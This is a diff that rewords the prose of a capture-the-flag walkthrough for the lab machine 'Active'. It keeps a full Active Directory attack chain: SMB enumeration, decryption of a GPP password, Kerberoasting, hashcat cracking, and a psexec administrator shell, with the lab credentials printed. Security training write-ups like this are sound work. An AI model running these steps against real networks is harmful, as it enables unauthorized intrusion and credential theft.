@@ -20,21 +20,21 @@ aliases:
 # Walkthrough
 
 
-We will start with the basics, let's do an `nmap` scan to see what this machine has to offer.
+Let's start with the basics and run an `nmap` scan to see what the machine is exposing.
 
-First let's find the ports
+First, I'll enumerate the open ports.
 
 ```
 nmap -sS -p- $T --min-rate 5000 -oG openPorts
 ```
 
-- `$T` is a variable i created to store the IP of the target machine
+- `$T` is a variable I use to hold the target's IP address.
 
-We are  storing it in a `grepable` format because i have a little functionality called `"ExtractPorts"` in my `zsh` that takes a file and with grep copies the open ports to the clipboard do we don't have to write them manually and/or scan for all ports again
+I save the results in a `grepable` format because I have a small `zsh` function called `"ExtractPorts"` that reads the file and copies the open ports straight to the clipboard. That saves me from typing them out by hand or scanning the full range again.
 
-Here you can find the dotfiles for the kali I created -> [Dotfiles](https://github.com/MarcussanMG/kali-dotfiles)
+You can find the Kali dotfiles I put together here -> [Dotfiles](https://github.com/MarcussanMG/kali-dotfiles)
 
-Once we have the ports, we will do another `nmap` going more in detail
+With the ports in hand, I'll run a second, more detailed `nmap` scan.
 
 ```
 nmap $T -Pn -n -sVC  --min-rate 3000 -oX results.txt -p 53,88,135,139,389,445,464,593,636,3268,3269,5722,9389,47001,49152,49153,49154,49155,49157,49158,49162,49167,49169
@@ -89,14 +89,14 @@ Host script results:
 ```
 
 
-Let's add the domain name to the `/etc/hosts` for `kerberos` to properly work with out machine.
+Let's add the domain name to `/etc/hosts` so that `kerberos` works correctly against the machine.
 
 ```
 netexec smb $T
 SMB         10.129.158.220  445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:None) (Null Auth:True)
 ```
 
-Let's try some enumeration
+Now let's do some enumeration.
 
 ```
 nxc smb $T -u '' -p '' --shares
@@ -104,13 +104,13 @@ nxc smb $T -u '' -p '' --shares
 
 ![](../../0.%20Assets/Active-1791231684634.webp)
 
-Okay let's see what we can get from here
+Let's see what we can pull from here.
 
 ```
 netexec smb $T -u '' -p '' -M spider_plus -o DOWNLOAD_FLAG=true
 ```
 
-Well I found GPP credentials (left by an administrator to set up computers automatically)
+This turned up GPP credentials, the kind an administrator leaves behind to provision computers automatically.
 
 ![](../../0.%20Assets/Active-1791283117559.webp)
 
@@ -122,7 +122,7 @@ gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuN
 
 ![](../../0.%20Assets/Active-1791283049846.webp)
 
-And let's see if the credentials are correct
+Let's check whether the credentials are valid.
 
 ```
 netexec smb $T -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18'
@@ -130,7 +130,7 @@ netexec smb $T -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18'
 
 ![](../../0.%20Assets/Active-1791283171465.webp)
 
-Great, let's see what we can do with these credentials
+With valid credentials, let's see what access they give us.
 
 
 ```
@@ -139,7 +139,7 @@ Great, let's see what we can do with these credentials
 
 ![](../../0.%20Assets/Active-1791283310796.webp)
 
-Okay `ldap` and `smb`, let's do some share enumeration again
+We have `ldap` and `smb`, so let's enumerate the shares again.
 
 ```
 netexec smb $T -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' --shares
@@ -147,14 +147,14 @@ netexec smb $T -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' --shares
 
 ![](../../0.%20Assets/Active-1791283910271.webp)
 
-Great! now we are allowed to read `NETLOGON` , `SYSVOL` and `Users`
-Let's get it
+Now we can read `NETLOGON`, `SYSVOL` and `Users`.
+Let's pull them.
 
 ```
 netexec smb "$T" -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' -M spider_plus -o DOWNLOAD_FLAG=true OUTPUT_FOLDER=.
 ```
 
-This spidering was not really working so I did manual enumeration
+The spidering wasn't cooperating, so I switched to manual enumeration.
 
 ```
 smbclient //$T/Users -U 'SVC_TGS%GPPstillStandingStrong2k18'
@@ -162,13 +162,13 @@ smbclient //$T/Users -U 'SVC_TGS%GPPstillStandingStrong2k18'
 
 ![](../../0.%20Assets/Active-1791284432880.webp)
 
-And inside the share named as the user you can find the flag
+Inside the share named after the user, we find the flag.
 
 ![](../../0.%20Assets/Active-1791284451654.webp)
 
-I went through the rest of folders and shares and didn't find much so let's move to something else.
+I went through the rest of the folders and shares without finding much, so let's move on.
 
-Let's try retrieving users
+Next, let's try to retrieve the domain users.
 
 ```
 netexec smb $T -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' --rid-brute 10000
@@ -176,18 +176,18 @@ netexec smb $T -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' --rid-brute 10000
 
 ![](../../0.%20Assets/Active-1791285678842.webp)
 
-There is not anything super interesting regarding users but `DC$`
+Nothing stands out among the users apart from `DC$`.
 
-Let's see with `as-rep` roasting what we can find
+Let's see what `as-rep` roasting turns up.
 
-First let's get a clean list of users
+First, I'll build a clean list of users.
 ```
 netexec smb $T -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' --rid-brute 10000  | grep "(SidTypeUser)" | cut -d '\' -f2 | cut -d ' ' -f1 > users.txt
 ```
 
 ![|514x182](../../0.%20Assets/Active-1791285779719.webp)
 
-And now let's perform the attack
+Now let's run the attack.
 
 ```
 impacket-GetNPUsers 'active.htb/' \                               
@@ -200,7 +200,7 @@ impacket-GetNPUsers 'active.htb/' \
 
 ![](../../0.%20Assets/Active-1791285924074.webp)
 
-No luck here, let's try `Kerberoasting`
+No luck there, so let's try `Kerberoasting`.
 
 ```
 sudo impacket-GetUserSPNs -request -dc-ip $T active.htb/SVC_TGS:GPPstillStandingStrong2k18
@@ -208,9 +208,9 @@ sudo impacket-GetUserSPNs -request -dc-ip $T active.htb/SVC_TGS:GPPstillStanding
 
 ![](../../0.%20Assets/Active-1791285992635.webp)
 
-Bingo!
+That worked.
 
-Add that entire string into a file and run `hashcat` against it
+Drop the entire hash into a file and run `hashcat` against it.
 
 ```
 sudo hashcat -m 13100 admin.txt /usr/share/wordlists/rockyou.txt  --force
@@ -219,7 +219,7 @@ sudo hashcat -m 13100 admin.txt /usr/share/wordlists/rockyou.txt  --force
 
 ![](../../0.%20Assets/Active-1791286084982.webp)
 
-Let's see if the credentials are valid
+Let's confirm the credentials are valid.
 
 ```
 netexec smb $T -u 'administrator' -p 'Ticketmaster1968'
@@ -227,7 +227,7 @@ netexec smb $T -u 'administrator' -p 'Ticketmaster1968'
 
 ![](../../0.%20Assets/Active-1791286146583.webp)
 
-Perfect, let's perform a pass the hash to enter through `smb` with `psexec` 
+Now let's use `psexec` over `smb` to get a shell as administrator.
 
 ```
 impacket-psexec active.htb/administrator:'Ticketmaster1968'@$T
@@ -237,4 +237,4 @@ impacket-psexec active.htb/administrator:'Ticketmaster1968'@$T
 
 ![](../../0.%20Assets/Active-1791286285755.webp)
 
-And we are done!
+And that's the machine done.
